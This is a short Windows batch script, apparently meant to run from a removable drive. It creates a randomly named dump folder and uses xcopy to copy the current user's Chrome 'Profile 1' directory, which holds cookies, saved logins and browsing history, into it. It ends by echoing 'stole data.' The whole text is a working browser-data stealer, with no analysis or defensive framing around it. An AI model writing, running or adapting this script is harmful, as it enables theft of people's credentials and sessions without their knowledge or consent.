%current_drive%
set rand=%random%-%Random%
md %dump_data_path%\chrome_data_dump\%Username%_%rand%
%HOMEDRIVE%
cd %HOMEDRIVE%\Windows\System32
xcopy /y "%localappdata%\Google\Chrome\User Data\Profile 1" "%dump_data_path%\chrome_data_dump\%Username%_%rand%"
echo stole data.